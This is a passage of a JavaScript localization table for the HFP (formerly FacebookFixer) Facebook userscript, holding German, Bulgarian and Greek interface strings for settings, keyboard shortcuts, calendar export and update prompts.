		'ConfShortcutList' : '<b>Tastenkürzel</b> (Groß-/Kleinschreibung beachten!):<br /><br /><i>Auf jeder Seite:</i><br />&nbsp;<b>A</b> - Alben/Fotos<br />&nbsp;<b>B</b> - Chatliste ein-/ausblenden<br />&nbsp;<b>C</b> - HFP Einstellungen<br />&nbsp;<b>F</b> - Freunde<br />&nbsp;<b>H</b> - Startseite<br />&nbsp;<b>I</b> - Postfach<br />&nbsp;<b>L</b> - Reagieren von HFP auf Seitenänderung ein-/ausschalten<br />&nbsp;<b>N</b> - Benachrichtigungen<br />&nbsp;<b>P</b> - Mein Profil<br />&nbsp;<b>T</b> - Markierten Text übersetzen<br />&nbsp;<b>&lt;escape&gt;</b> - Von HFP erstellte Popups schließen<br /><br /><i>Auf der Startseite</i>:<br />&nbsp;<b>f</b> oder <b>l</b> - Live-Feed<br />&nbsp;<b>i</b> - Posted items<br />&nbsp;<b>n</b> - News-Feed<br />&nbsp;<b>p</b> - Fotos<br />&nbsp;<b>s</b> oder <b>u</b> - Status-Updates<br /><br /><i>Auf Profilseiten</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Fotos<br />&nbsp;<b>w</b> - Pinnwand<br />&nbsp;<b>x</b> - Felder<br /><br /><i>Auf Seiten mit Seitenzahlen (zurück, vor, etc)</i><br />&nbsp;<b>&lt;Pfeil-nach-Links&gt;</b> - Zurück<br />&nbsp;<b>&lt;Pfeil-nach-Rechts&gt;</b> - Vor<br />&nbsp;<b>&lt;Shift&gt; + &lt;Pfeil-nach-Links&gt;</b> - Erste (wenn verfügbar)<br />&nbsp;<b>&lt;Shift&gt; + &lt;Pfeil-nach-Rechts&gt;</b> - Letzte (wenn verfügbar)<br /><br /><i>Bei der Anzeige von Alben & Fotos:</i><br />&nbsp;<b>a</b> - Alle Vorschaubilder laden (wenn verfügbar)<br />&nbsp;<b>b</b> - Große Bilder anzeigen<br />&nbsp;<b>c</b> - Kommentare anzeigen<br />&nbsp;<b>k</b> - Zurück zum Album<br />&nbsp;<b>m</b> - Fotos der Person und mir<br /><br /><i>Bei neuen Alben und getaggten/hochgeladenen Fotos:</i><br />&nbsp;<b>a</b> oder &nbsp;<b>r</b> - Neue Alben<br />&nbsp;<b>m</b> oder &nbsp;<b>u</b> - Mobile Uploads<br />&nbsp;<b>o</b> - Fotos von mir<br />&nbsp;<b>p</b> - Meine Fotos<br />&nbsp;<b>t</b> oder &nbsp;<b>f</b> - Getaggte Freunde',
		'ConfNewTabSearch' : 'Suchergebnisse in einem neuen Tab/Fenster öffnen, wenn für die Suche STRG + Enter gedrückt wurde.',
		'ConfPageTitle' : '"Facebook |" überall aus dem Seitentitel entfernen.',
		'ConfPhotoPopup' : 'Größere Versionen von Fotos im Popup anzeigen, wenn sie mit der Maus berührt werden.',
		'ConfPopupAutoClose' : 'Bilder-Popup automatisch schließen.',
		'ConfPopupPosition' : 'Position des Bilder-Popups',
		'ConfProfilePicPopup' : 'Größere Profilbilder im Popup anzeigen, wenn sie mit der Maus berührt werden',
		'ConfProtocolLinks' : 'Messenger-IDs der Profile in Links umwandeln, über die eine Kommunikation gestartet werden kann (Google Talk, Windows Live etc).',
		'ConfSecureLinks' : 'HTTPS-Verbindung für alle Facebook-Links verwenden.',
		'ConfShortcuts' : 'Tastenkürzel aktivieren. (<a href="#" id="fbfKeyboardShortcutsLink" onclick="return false;">Liste ansehen</a>)',
		'ConfSign' : 'Sternzeichen im Profil anzeigen (wenn das volle Geburtsdatum angegeben wurde).',
		'ConfTopBarFixed' : 'Obere Menüleiste auch beim Scrollen anzeigen.',
		'ConfTopBarHoverOpacity' : 'Bei Mouse-Over',
		'ConfTopBarOpacity' : 'Transparenz der oberen Menüleiste',
		'DownloadVideo' : 'Video herunterladen',
		'ExportICalendarFile' : 'iCalendar-Export',
		'ExportICalendarFileWarning' : '(kann bei einer großen Zahl an Freunden eine Weile dauern)',
		'fullAlbumLoaded' : 'Album vollständig geladen',
		'Left' : 'Links',
		'ListeningRestarted' : 'HFP reagiert wieder auf Änderungen.',
		'ListeningStopped' : 'HFP reagiert nicht auf Änderungen.\nL (SHIFT + l) drücken, um die Reaktion wieder zu aktvieren.',
		'LoadingAllPhotos' : 'Lade alle Fotos...',
		'loadingFullAlbum' : 'Lade komplettes Album...',
		'LoadingPic' : 'Lade Bild...',
		'LoadPhotosWarning' : 'Das Laden aller Bilder kann längere Zeit dauern',
		'Months' : new Array('Januar','Februar','März','April','Mai','Juni','Juli','August','September','Oktober','November','Dezember'),
		'ProtocolSkype' : '%s per Skype anrufen',
		'ProtocolMSN' : 'Mit %s per Windows Live chatten',
		'ProtocolYahoo' : 'Mit %s per Yahoo Messenger chatten',
		'ProtocolGoogle' : 'Mit %s per Google Talk chatten',
		'ReloadErrorPage' : 'Klicken, um es erneut zu versuchen, oder 5 Sekunden warten',
		'Remove' : 'Entfernen',
		'Right' : 'Rechts',
		'ShowBigPictures' : 'Große Bilder anzeigen',
		'Signs' : new Array('Steinbock','Wassermann','Fische','Widder','Stier','Zwillinge','Krebs','Löwe','Jungfrau','Waage','Skorpion','Schütze'),
		'today' : 'heute',
		'UpdateAvailable1' : 'Es gibt ein Update für HFP',
		'UpdateAvailable2' : 'Update jetzt herunterladen?',
		'UpdateHomepage' : 'Zur Webseite',
		'UpdateInstall' : 'Jetzt installieren',
		'UpdateTomorrow' : 'Morgen erinnern',
		'yearsOld' : '%s Jahre alt'
	},

	// Bulgarian - Contributed by Svetlozar Mladenoff (20090830)
	bg : {
		'_language' : 'Bulgarian',
		'AddToCalendar' : 'Добавяне към Календар',
		'AddToGoogleCalendar' : 'Добавяне към Google Calendar',
		'all' : 'всички',
		'All' : 'Всички',
		'AllPhotosLoaded' : 'Всички снимки са заредени',
		'Automatic' : 'Автоматично',
		'Birthday' : 'Рождения ден на %s',
		'CreatingFile' : 'Създаване на файл',
		'Close' : 'Затваряне',
		'ConfigureFacebookFixer' : 'Конфигуриране на HFP',
		'ConfigureInstructions' : 'Всички промени се запаметяват веднага, но някои може да не придобият ефект при вече отворени табове.',
		'ConfAge' : 'Показване на възрастта (ако потребителите са представили пълна рождена дата).',
		'ConfAutoBigAlbumPictures' : 'Автоматично показване на по-големи снимки от албумите, когато страницата се зареди.',
		'ConfAutoLoadFullAlbum' : 'Автоматично зареждане на превюта за всички картини в албум, събиращи се на една страница.',
		'ConfAutoLoadTaggedPhotos' : 'Автоматично зареждане на превюта на всички тагнати снимки, събиращи се на една страница (табът Снимки на профила).',
		'ConfBigAlbumPictures' : 'Добавяне на връзка на страницата с албуми за показване на увеличени версии на всички снимки, съществуващи на тази страница.',
		'ConfBottomBarHoverOpacity' : 'При курсор отгоре',
		'ConfBottomBarOpacity' : 'Прозрачност на долното меню',
		'ConfCalendarBirthDate' : 'Включване на рождената дата на потребителя в детайлите на събитието.',
		'ConfCalendarFullName' : 'Използване на трите имена на човека като заглавие за рождените дни (в замяна на само първото име).',
		'ConfChatDifferentiate' : 'Използване на удебелен и наклонен шрифт за различаване на приятели на линия и офлайн.',
		'ConfChatHideIdle' : 'Скриване на офлайн-приятелите.',
		'ConfDelayPopupPics' : 'Изчакване от половин секунда преди показване на превю на снимка.',
		'ConfDownloadVideo' : 'Добавяне на връзка за теглене от видео страниците. (Може да ви трябва <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV плейър</a>)',
		'ConfErrorPageReload' : 'Автоматично презареждане на страниците с грешки от приложения след 5 секунди.',
		'ConfExternalPopup' : 'Пълен размер на външните картинки при превю. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Език за HFP',
		'ConfGoogleApps' : 'Създаване на Google Calendar връзки, съвместими с Google Apps.',
		'ConfGoogleAppsDomain' : 'Домейн',
		'ConfGoogleCalendar' : 'Добавяне на връзки за прибавяне на рождени дни и събития в <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Език за <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHomeFindFriends' : 'Показване на Свържете се с приятели секцията.',
		'ConfHomeLeftAlign' : 'Ляво подравняване на съдържанието на главната страница.',
		'ConfHomePeopleYouMayKnow' : 'Показване на секция Предложения.',
		'ConfHomePokes' : 'Показване на секцията за Сръчквания.',
		'ConfHomeRightColumn' : 'Показване на дясната колона.',
		'ConfiCalendar' : 'Добавяне на връзки за изтегляне на <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a>-файл с всички рождени дни.',
		'ConfShortcutList' : '<b>Бързи бутони</b> (големи/малки чувствителни):<br /><br /><i>От коя да е страница:</i><br />&nbsp;<b>A</b> - Албуми/снимки<br />&nbsp;<b>B</b> - Превключване на списък Приятели на линия<br />&nbsp;<b>C</b> - Конфигуруране на HFP<br />&nbsp;<b>F</b> - Приятели<br />&nbsp;<b>H</b> - Главна страница<br />&nbsp;<b>I</b> - Входяща кутия<br />&nbsp;<b>L</b> - Разрешаване/Забраняване на HFP да проверява за промени по страниците<br />&nbsp;<b>N</b> - Известия<br />&nbsp;<b>P</b> - Профил<br />&nbsp;<b>T</b> - Превод на маркирания текст<br />&nbsp;<b>&lt;escape&gt;</b> - Затваряне на изскачащи прозорци, отворени от HFP<br /><br /><i>На заглавната страница</i>:<br />&nbsp;<b>f</b> or <b>l</b> - Новини на живо<br />&nbsp;<b>i</b> - Публикации<br />&nbsp;<b>n</b> - Новини<br />&nbsp;<b>p</b> - Снимки<br />&nbsp;<b>s</b> или <b>u</b> - Промени в статуса<br /><br /><i>На профилите</i>:<br />&nbsp;<b>i</b> - Инфо<br />&nbsp;<b>p</b> - Снимки<br />&nbsp;<b>w</b> - Стена<br />&nbsp;<b>x</b> - Кутии<br /><br /><i>На страници с навигация (предишна, следваща и т.н.)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Предишна<br />&nbsp;<b>&lt;right arrow&gt;</b> - Следваща<br />&nbsp;<b>&lt;Shift&gt; + &lt;left arrow&gt;</b> - Първа (когато е възможно)<br />&nbsp;<b>&lt;Shift&gt; + &lt;right arrow&gt;</b> - Последна (когато е възможно)<br /><br /><i>При разглеждане на албуми/снимки:</i><br />&nbsp;<b>a</b> - Зареждане на всички превюта (когато е възможно)<br />&nbsp;<b>b</b> - Показване на големи снимки<br />&nbsp;<b>c</b> - Преглед на коментарите<br />&nbsp;<b>k</b> - Назад към албума<br />&nbsp;<b>m</b> - Снимки на (някой) и мен<br /><br /><i>При разглеждане на скорошни албуми и качени/тагнати снимки:</i><br />&nbsp;<b>a</b> или &nbsp;<b>r</b> - Скорошни албуми<br />&nbsp;<b>m</b> или &nbsp;<b>u</b> - Качвания от мобилно устройство<br />&nbsp;<b>o</b> - Снимки с мен<br />&nbsp;<b>p</b> - Мои снимки<br />&nbsp;<b>t</b> или &nbsp;<b>f</b> - Тагнати приятели',
		'ConfNewTabSearch' : 'Резултатите от търсения да се отварят в нов таб/прозорец, когато е натиснат Ctrl + Enter при търсене.',
		'ConfPageTitle' : 'Премахване на "Facebook |" от заглавието на всяка страница.',
		'ConfPhotoPopup' : 'Показване на по-големи превюта на снимките при курсор отгоре.',
		'ConfPopupAutoClose' : 'Автоматично затваряне на изскачащите картинки.',
		'ConfPopupPosition' : 'Позиция на изскачащите картинки',
		'ConfProfilePicPopup' : 'Показване на по-големи превюта на профилните снимки при курсор отгоре',
		'ConfProtocolLinks' : 'Превръщане на ID-тата по профилите във връзки, който започват разговор (Google Talk, Windows Live и т.н.).',
		'ConfSecureLinks' : 'Принуждаване на Facebook връзките да водят до HTTPS страници.',
		'ConfShortcuts' : 'Разрешаване на Бързи бутони. (Вижте <a href="#" id="fbfKeyboardShortcutsLink" onclick="return false;">списъка</a>)',
		'ConfSign' : 'Показване зодията по профилите (ако е въведена рождена дата).',
		'ConfTopBarFixed' : 'Запазване на горното меню на екрана, дори при скролиране.',
		'ConfTopBarHoverOpacity' : 'При курсор отгоре',
		'ConfTopBarOpacity' : 'Прозрачност на горното меню',
		'DownloadVideo' : 'Смъкване на видеото',
		'ExportICalendarFile' : 'Експортиране в iCalendar-файл',
		'ExportICalendarFileWarning' : '(Това ще отнеме време, ако имате много приятели)',
		'fullAlbumLoaded' : 'целият албум е зареден',
		'Left' : 'Отляво',
		'ListeningRestarted' : 'HFP възстанови проверките за промени.',
		'ListeningStopped' : 'HFP спря проверките за промени.\nНатиснете L (Shift + l) за повторно пускане',
		'LoadingAllPhotos' : 'Зареждане на всички снимки...',
		'loadingFullAlbum' : 'зареждане на целия албум...',
		'LoadingPic' : 'Зареждане на снимката...',
		'LoadPhotosWarning' : 'Зареждането на всички снимки може да отнеме много време',
		'Months' : new Array('Януари','Февруари','Март','Април','Май','Юни','Юли','Август','Септември','Октомври','Ноември','Декември'),
		'ProtocolSkype' : 'Обаждане на %s по Skype',
		'ProtocolMSN' : 'Чат с %s чрез Windows Live',
		'ProtocolYahoo' : 'Чат с %s чрез Yahoo Messenger',
		'ProtocolGoogle' : 'Чат с %s чрез Google Talk',
		'ReloadErrorPage' : 'Кликнете за повторен опит или изчакайте 5 секунди',
		'Remove' : 'Премахване',
		'Right' : 'Отдясно',
		'ShowBigPictures' : 'Показване на големи снимки',
		'Signs' : new Array('Козирог','Водолей','Риби','Овен','Телец','Близнаци','Рак','Лъв','Дева','Везни','Скорпион','Стрелец'),
		'today' : 'днес',
		'UpdateAvailable1' : 'Излязло е обновление на HFP',
		'UpdateAvailable2' : 'Желаете ли да обновите сега?',
		'UpdateHomepage' : 'Към главната страница',
		'UpdateInstall' : 'Инсталиране сега',
		'UpdateTomorrow' : 'Напомняне утре',
		'yearsOld' : 'на %s години'
	},

	// Greek - Contributed by Dimitris DoSMaN Sarlis (20110309)
	el : {
		'_language' : 'Greek',
		'AddToCalendar' : 'Προσθήκη στο Ημερολόγιο',
		'AddToGoogleCalendar' : 'Προσθήκη στο Ημερολόγιο του Google',
		'all' : 'όλα',
		'All' : 'Όλα',
		'AllPhotosLoaded' : 'Οι φωτογραφίες έχουν φορτώσει',
		'Automatic' : 'Αυτόματα',
		'Birthday' : 'Γεννέθλια %s',
		'BookmarkAdd' : 'Προσθήκη Νέου Αγαπημένου',
		'BookmarkExists' : 'Υπάρχει ήδη αγαπημένο για αυτήν την σελίδα.\n\nΠηγαίντε στην σελίδα που θέλετε να προσθέσετε και δοκιμάστε ξανά.',
		'BookmarkNamePrompt' : 'Δώστε ένα όνομα για αυτό το αγαπημένο:\n%s',
		'BookmarksConfirmRemoval' : 'Είστε σίγουρος ότι θέλετε να αφαιρέσετε τα παρακάτω αγαπημένα;',
		'BookmarksManage' : 'Διαχείριση Αγαπημένων',
		'BookmarksRemoveSelected' : 'Αφαίρεση Επιλεγμένων Αγαπημένων',
		'Bookmarks' : 'Αγαπημένα',
		'BrowserUnsupported' : 'Ο περιηγητής σας δεν υποστηρίζει αυτήν την δυνατότητα.',
		'CreatingFile' : 'Δημιουργία Αρχείου',
		'Close' : 'Κλείσιμο',
		'ConfigureFacebookFixer' : 'Ρυθμίσεις HFP',
		'ConfigureInstructions' : 'Όλες οι αλλαγές αποθηκεύονται άμεσα, αλλά κάποιες αλλαγές μπορεί να μην εφαρμοστούν σε καρτέλες που είναι ήδη ανοιχτές.',
		'ConfAge' : 'Εμφάνιση της ηλικίας ατόμων στο προφίλ τους (μόνο εφόσον έχουν δηλώσει την πλήρης ημερομηνία).',
		'ConfApplicationWhitelist' : 'Λίστα Επιτρεπτών Εφαρμογών - Εισάγετε τα IDs από τις εφαρμογές που θέλετε να εμφανίζονται. Διαχωρίστε τα IDs με κενό.',
		'ConfAutoBigAlbumPictures' : 'Αυτόματη εμφάνιση μεγάλων εικόνων άλμπουμ όταν η σελίδα ανοίξει.',
		'ConfAutoLoadFullAlbum' : 'Αυτόματη εμφάνιση μικρογραφιών για όλες τις εικόνες του άλμπουμ σε μία σελίδα.',
		'ConfAutoLoadTaggedPhotos' : 'Αυτόματη εμφάνιση μικρογραφιών για όλες τις "σημαδεμένες" φωτογραφίες σε μία σελίδα (στην καρτέλα φωτογραφιών, στο προφίλ των ανθρώπων).',
		'ConfAutoReadMore' : 'Αυτόματο κλικ στο σύνδεσμο "Παλαιότερες δημοσιεύσεις"',
		'ConfBigAlbumPictures' : 'Προσθήκη συνδέσμου στις σελίδες των άλμπουμ, για εμφάνιση μεγαλύτερων εκδοχών όλων των εικόνων στην συγκεκριμένη σελίδα.',
		'ConfBigAlbumPicturesBorder' : 'Προσθήκη ενός πλαισίου γύρω από τις μεγάλες εκδόσεις των εικόνων.',
		'ConfBookmarks' : 'Προσθήκη ενός υπομενού Αγαπημένων στην πάνω μπάρα.',
		'ConfBottomBarHoverOpacity' : 'Κατά το πέρασμα του ποντικιού',
		'ConfBottomBarOpacity' : 'Διαφάνεια της κάτω γραμμής μενού.',
		'ConfCalendarBirthDate' : 'Να συμπεριληφθεί η ημερομηνία γέννησης του ατόμου στης λεπτομέρειες γεγονότων.',
		'ConfCalendarFullName' : 'Χρήση του πλήρες ονόματος του ατόμου σαν τίτλο γενεθλίων (αντί για μόνο το όνομα).',
		'ConfChatDifferentiate' : 'Χρήση έντονων και πλαγίων γραμμάτων για διαφοροποίηση μεταξύ διαθέσιμων και αδρανών φίλων.',
		'ConfChatHideIdle' : 'Απόκρυψη αδρανών φίλων.',
		'ConfDelayPopupPics' : 'Αναμονή 0.5 δευτερολέπτων πριν την εμφάνιση αναδυόμενων εικόνων.',
		'ConfDelayPopupPicsTimeout' : 'Χρονοκαθυστέριση πριν την εμφάνιση των αναδυόμενων εικόνων, σε χιλιοστά του δευτερολέπτου (προεπιλογή=500):',
		'ConfDownloadVideo' : 'Προσθήκη συνδέσμου για λήψη βίντεο από τις σελίδες βίντεο. (Μπορεί να χρειαστείτε το <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfDisableTheater' : 'Απενεργοποίηση παρουσίασης φωτογραφιών.',
		'ConfErrorPageReload' : 'Αυτόματη επαναφόρτωση σελίδων εφαρμογών με σφάλματα, μετά από 5 δευτερόλεπτα.',
		'ConfExport' : 'Για να εξάγετε τις ρυθμίσεις σας, αντιγράψτε το κείμενο παρακάτω και σώστε το σε αρχείο.',
		'ConfExternalPopup' : 'Ανάδυση πραγματικού μεγέθους για εξωτερικές εικόνες. <sup>Δοκιμαστικό</sup>',
		'ConfFacebookHFPLanguage' : 'Επιλογή γλώσσας για το HFP',
		'ConfFacebookTimestamps' : 'Εμφάνιση της ώρας του Facebook (πχ. "Πριν 3 ώρες").',
		'ConfFBFTimestamps' : 'Προσθήκη της ώρας του HFP μετά από την ώρα του Facebook (πχ. "11:45").',
		'ConfFBFTimestamps24' : 'Εμφάνιση της ώρας του HFP σε 24-ωρη μορφή.',
		'ConfFriendRequestCountInTitle' : 'Εμφάνιση του αριθμού των προσκλήσεων φίλων στον τίτλο της σελίδας.',
		'ConfGoogleApps' : 'Δημιουργία Ημερολογίου Google, συμβατό με Εφαρμογές Google.',
		'ConfGoogleAppsDomain' : 'Τομέας',
		'ConfGoogleCalendar' : 'Προσθήκη συνδέσμων για πρόσθεση γεννεθλίων και γεγονότων στο <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Ημερολόγιο Google</a>.',
		'ConfGoogleLanguage' : 'Επιλογή γλώσσας για <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Μεταφραστή Google</a>',
		'ConfHideApplicationStories' : 'Απόκρυψη ιστοριών εφαρμογών.',
		'ConfHideEgos' : 'Απόκρυψη όλων των τομέων "εγώ" (θα πρέπει να κρύβει τις περισσότερες προτάσεις του Facebook).',
		'ConfHideEventStories' : 'Απόκρυψη ιστοριών εκδηλώσεων.',
		'ConfHideFacebookCountInTitle' : 'Απόκρυψη του μετρητή νέων εισερχομένων μηνυμάτων του Facebook.',
		'ConfHideFriendStories' : 'Απόκρυψη ιστοριών φίλων.',
		'ConfHideGroupStories' : 'Απόκρυψη ιστοριών ομάδων.',
		'ConfHideHovercards' : 'Απόκρυψη αναδυόμενων καρτών (η κάρτα που εμφανίζεται όταν περνάει το ποντίκι πάνω από κάποιο όνομα).',
		'ConfHideLikeStories' : 'Απόκρυψη των ιστοριών "μου αρέσει".',
		'ConfHideLinkStories' : 'Απόκρυψη ιστοριών συνδέσμων.',
		'ConfHideNoteStories' : 'Απόκρυψη των ιστοριών σημειώσεων.',
		'ConfHidePhotoStories' : 'Απόκρυψη ιστοριών φωτογραφιών.',
		'ConfHidePlaceStories' : 'Απόκρυψη ιστοριών τόπου.',
		'ConfHideProfilePicStories' : 'Απόκρυψη ιστοριών εικόνας προφίλ.',
		'ConfHideRead' : 'Απόκρυψη αντικειμένων από την τροφοδοσία νέων που έχουν σημειωθεί σαν διαβασμένα.',
		'ConfHideRelationshipStories' : 'Απόκρυψη ιστοριών φιλίας.',
		'ConfHideStatusStories' : 'Απόκρυψη ιστοριών κατάστασης.',
		'ConfHideVideoStories' : 'Απόκρυψη ιστοριών Βίντεο.',
		'ConfHideWallStories' : 'Απόκρυψη ιστοριών τοίχου.',
		'ConfHomeBeta' : 'Εμφάνιση του τομέα Δοκιμαστικής Έκδοσης του Facebook.',
		'ConfHomeChat' : 'Εμφάνιση του τομέα Συνομιλίας.',
		'ConfHomeChatNames' : 'Εμφάνιση ονομάτων στον τομέα Συνομιλίας.',
		'ConfHomeEvents' : 'Εμφάνιση της κατηγορίας εκδηλώσεων.',
		'ConfHomeFindFriends' : 'Εμφάνιση του τομέα "Συνδεθείτε με φίλους".',
		'ConfHomeLeftAlign' : 'Αριστερή στοίχιση των περιεχομένων της αρχικής σελίδας.',
		'ConfHomeLeftColumn' : 'Εμφάνιση της αριστερής στήλης.',
		'ConfHomeLeftColumnFixed' : 'Πάγωμα αριστερής στήλης, ακόμα και αν μετακινήστε προς τα κάτω.',
		'ConfHomeLink' : 'Εμφάνιση του συνδέσμου της Αρχικής Σελίδας στην πάνω μπάρα.',
		'ConfHomeNavigation' : 'Εμφάνιση του τομέα Πλοήγησης.',
		'ConfHomePokes' : 'Εμφάνιση των σκουντηγμάτων.',
		'ConfHomeProfile' : 'Εμφάνιση του τομέα Προφίλ.',
		'ConfHomeRecommendations' : 'Εμφάνιση προτάσεων (Άτομα που ίσως γνωρίζεις, Προτεινόμενες Σελίδες κλπ).',
		'ConfHomeRequests' : 'Εμφάνιση της κατηγορίας Αιτημάτων.',
		'ConfHomeRightColumn' : 'Εμφάνιση του δεξιού τμήματος.',
		'ConfHomeStretch' : 'Άνοιγμα της αρχικής σελίδας με βάση το πλάτος του παραθύρου του περιηγητή.',
		'ConfHomeStretchMiddleColumn' : 'Άνοιγμα των περιεχομένων της μεσαίας στήλης της αρχικής σελίδας.',
		'ConfiCalendar' : 'Προσθήκη συνδέσμων για λήψη αρχείου <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> με όλα τα γεννέθλια.',
		'ConfImport' : 'Για να εισάγετε τις ρυθμίσεις σας αργότερα, αντικαταστήστε το κείμενο που αποθηκεύσατε προηγουμένως και πατήστε στο κουμπί "Εισαγωγή".',
		'ConfInboxCountInTitle' : 'Εμφάνιση του πλήθους των αδιάβαστων μηνυμάτων στα εισερχόμενα στον τίτλο της σελίδας.',
		'ConfLogoutLink' : 'Προσθήκη ενός συνδέσμου για αποσύνδεση στην πάνω μπάρα.',
		'ConfNotificationCountInTitle' : 'Εμφάνιση των νέων ειδοποιήσεων στον τίτλο της σελίδας.',
		'ConfNewTabSearch' : 'Άνοιγμα αναζήτησης σε καινούργια καρτέλα ή παράθυρο όταν πιέζετε το CTRL + Enter για αναζήτηση.',
		'ConfPageTitle' : 'Αφαίρεση του "Facebook |" από τον τίτλο της κάθε σελίδας.',
		'ConfPhotoPopup' : 'Εμφάνιση αναδυόμενων φωτογραφιών σε πραγματικό μέγεθος κατά το πέρασμα του ποντικιού.',
		'ConfPopupAutoClose' : 'Κλείσιμο αναδυόμενων φωτογραφιών αυτόματα.',
		'ConfPopupSmartAutoClose' : 'Αποτροπή κλεισίματος αναδυόμενων φωτογραφιών εάν το ποντίκι είναι πάνω τους.',
		'ConfPopupPosition' : 'Θέση αναδυόμενων φωτογραφιών',
		'ConfPopupWhileTagging' : 'Εμφάνιση αναδυόμενων εικόνων ακόμα και στην προσθήκη ετικέτας.',
		'ConfProcessInterval' : 'Διάστημα που απαιτείται για να φορτώσει η σελίδα, σε χιλιοστά του δευτερολέπτου. (προεπιλογή=1000):',
		'ConfProfileLink' : 'Εμφάνιση του συνδέσμου Προφίλ στην πάνω μπάρα.',
		'ConfProfilePicPopup' : 'Εμφάνιση αναδυόμενων φωτογραφιών προφίλ σε πραγματικό μέγεθος κατά το πέρασμα του ποντικιού',
		'ConfProtocolLinks' : 'Μετατροπή του Messenger IDs των προφίλ σε συνδέσμους όπου μπορεί να ξεκινήσει συζήτηση με αυτούς (Google Talk, Windows Live κλπ).',
		'ConfSectionAbout' : 'Σχετικά με το HFP',
		'ConfSectionAdvanced' : 'Για προχωρημένους',
		'ConfSectionEvents' : 'Γεννέθλια/Εκδηλώσεις',
		'ConfSectionImportExport' : 'Εισαγωγή/Εξαγωγή',
		'ConfSectionFeeds' : 'Τροφοδοσίες',
		'ConfSectionHomePage' : 'Αρχική Σελίδα',
		'ConfSectionLiveFeed' : 'Τελευταία Νέα',
		'ConfSectionMenu' : 'Μενού/Συνομιλία',
		'ConfSectionOther' : 'Άλλες Επιλογές',
		'ConfSectionPageTitle' : 'Τίτλος Σελίδας',
		'ConfSectionPictures' : 'Εικόνες',
		'ConfSectionShortcuts' : 'Συντομεύσεις Πληκτρολογίου',
		'ConfSecureLinks' : 'Εξανάγκασε τους συνδέσμους του Facebook να δείχνουν σε ασφαλείς (HTTPS) σελίδες.',
		'ConfShortcutList' : '<b>Συντομεύσεις Πληκτρολογίου</b> (ευαισθησία χαρακτήρων):<br /><br /><i>Από οποιαδήποτε σελίδα:</i><br /> <b>A</b> - Άλμπουμ/Φωτογραφίες<br /> <b>B</b> - Εμφάνιση/Απόκρυψη λίστα φίλων (διαθέσιμοι φίλοι)<br /> <b>C</b> - Επιλογές HFP<br /> <b>F</b> - Φίλοι<br /> <b>H</b> - Αρχική Σελίδα<br /> <b>I</b> - Εισερχόμενα<br /> <b>K</b> - Προσθήκη Αγαπημένου<br /> <b>L</b> - Επιλογή του συνδέσμου αποσύνδεσης (πατήστε το Enter αμέσως μετά για να αποσυνδεθείτε)<br /> <b>N</b> - Ειδοποιήσεις<br /> <b>P</b> - Το προφίλ σας<br /> <b>T</b> - Μετάφραση επιλεγμένου κειμένου<br /> <b><escape></b> - Κλείσιμο αναδυόμενων δημιουργημένα από το HFP<br /><br /><i>Από την αρχική σελίδα</i>:<br /> <b>f</b> ή <b>l</b> - Ζωντανές τροφοδοτήσεις<br /> <b>i</b> - Δημοσιευμένα στοιχεία<br /> <b>n</b> - Τροφοδότηση Νέων<br /> <b>p</b> - Φωτογραφίες<br /> <b>s</b> ή <b>u</b> - Ανανεώσεις κατάστασης<br /><br /><i>Από προφίλ</i>:<br /> <b>i</b> - Πληροφορίες<br /> <b>p</b> - Φωτογραφίες<br /> <b>w</b> - Τοίχος<br /> <b>x</b> - Πλαίσια<br /><br /><i>Από σελίδες με πλοήγηση (προηγούμενη, επόμενη, κ.ά.)</i><br /> <b><αριστερό βελάκι></b> - Προηγούμενη<br /> <b><δεξί βελάκι></b> - Επόμενη<br /> <b><shift> + <αριστερό βελάκι></b> - Αρχική (όταν είναι διαθέσιμη)<br /> <b><shift> + <δεξί βελάκι></b> - Τελευταία (όταν είναι διαθέσιμη)<br /><br /><i>Κατά την προβολή άλμπουμ/φωτογραφίες:</i><br /> <b>a</b> - Φόρτωση όλων των μικρογραφιών (όταν είναι διαθέσιμο)<br /> <b>b</b> - Εμφάνιση μεγαλύτερων φωτογραφιών<br /> <b>c</b> - Εμφάνιση παρατηρήσεων<br /> <b>k</b> - Επιστροφή στο Άλμπουμ<br /> <b>m</b> - Φωτογραφίες από (άτομο) και εμένα<br /><br /><i>Κατά την διάρκεια πρόσφατων άλμπουμ και ανεβασμένων/σημειωμένων φωτογραφιών:</i><br /> <b>a</b> ή  <b>r</b> - Πρόσφατα Άλμπουμ<br /> <b>m</b> ή  <b>u</b> - Ανεβασμένα από κινητό<br /> <b>o</b> - Φωτογραφίες με μένα<br /> <b>p</b> - Οι φωτογραφίες μου<br /> <b>t</b> ή  <b>f</b> - Σημειωμένοι φίλοι',
		'ConfShortcuts' : 'Ενεργοποίηση συντομεύσεων πληκτρολογίου.',
		'ConfSign' : 'Εμφάνιση του ζωδίου του ατόμου στο προφίλ του (εφόσων έχει δώσει την πλήρης ημερομηνία γέννησης).',
		'ConfTopBarFixed' : 'Πάγωμα μπάρας μενού, ακόμα και αν η σελίδα κυλάει προς τα κάτω.',
		'ConfTopBarHoverOpacity' : 'Κατά το πέρασμα του ποντικιού',
		'ConfTopBarOpacity' : 'Διαφάνεια μπάρας μενού κορυφής',
		'DownloadVideo' : 'Λήψη Βίντεο',
		'ExportICalendarFile' : 'Εξαγωγή αρχείου iCalendar',
		'ExportICalendarFileWarning' : '(Αυτό θα πάρει αρκετή ώρα αν έχετε πολλούς φίλους)',
		'FacebookFixerConflict' : 'Το FacebookFixer είναι πλέον γνωστό σαν HFP. Λόγω της αλλαγής του ονόματος θα πρέπει να απεγκαταστήσετε χειροκίνητα το HFP από τον περιηγητή σας, διαφορετικά τα δύο προγράμματα θα συγκρούονται μεταξύ τους. Εάν δεν είσαστε σίγουροι για το πως να απεγκαταστήσετε ένα πρόγραμμα userscript, <a %s>πατήστε εδώ για οδηγίες</a>.',
